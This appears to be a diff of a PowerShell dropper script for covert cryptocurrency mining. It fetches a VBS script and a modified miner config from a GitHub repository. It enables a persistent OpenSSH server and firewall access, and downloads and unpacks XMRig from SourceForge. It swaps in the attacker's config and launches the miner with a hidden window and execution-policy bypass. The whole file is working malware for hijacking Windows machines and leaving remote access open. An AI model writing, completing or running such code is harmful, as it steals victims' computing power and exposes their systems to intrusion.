@@ -48,6 +48,9 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs
 #visual basic scrit to download the registry
 Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/calty.vbs -OutFile "calty.vbs"
 
+#Download modified config.json
+Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/config.json -OutFile "config.json"
+
 # enabling  persistent ssh
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
@@ -61,25 +64,31 @@ Get-NetFirewallRule -Name *ssh*
 New-Item -Name "$wd" -Path "$path" -ItemType Directory
 cd $wd
 
-Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/SHA256SUMS -OutFile "SHA256SUMS.txt"
+# Get the current directory
+$currentDirectory = $PWD
 
-Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/rig/WinRing0x64.sys -OutFile "WinRing0x64.sys"
+# Download the ZIP file
+Invoke-WebRequest -Uri "https://sourceforge.net/projects/xmrig.mirror/files/v6.22.2/xmrig-6.22.2-gcc-win64.zip/download" -OutFile "$currentDirectory\xmrig-6.22.2-gcc-win64.zip"
 
-Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/benchmark_10M.cmd -OutFile "benchmark_10M.cmd"
+# Extract the ZIP file in the current directory
+Expand-Archive -Path "$currentDirectory\xmrig-6.22.2-gcc-win64.zip" -DestinationPath $currentDirectory
 
-Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/benchmark_1M.cmd -OutFile "benchmark_1M.cmd"
+# Verify extraction
+Get-ChildItem -Path $currentDirectory
 
-Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/start.cmd -OutFile "start.cmd"
+#replace config.json
+$newConfigPath = "$path\config.json"
+$targetConfigPath = "$currentDirectory\config.json"
 
-Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/pool_mine_example.cmd -OutFile "pool_mine_example.cmd"
+if (Test-Path -Path $newConfigPath) {
+    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
+    Write-Output "Config.json file has been replaced successfully."
+} else {
+    Write-Output "New config.json file not found at the specified path."
+}
 
-Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/rtm_ghostrider_example.cmd -OutFile "rtm_ghostrider_example.cmd"
 
-Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/solo_mine_example.cmd -OutFile "solo_mine_example.cmd"
 
-Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/rig/xmrig.exe -OutFile "xmrig.exe"
-
-Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/config.json -OutFile "config.json"
 
 # start rig
 powershell -windowstyle hidden -ExecutionPolicy Bypass ./start.cmd
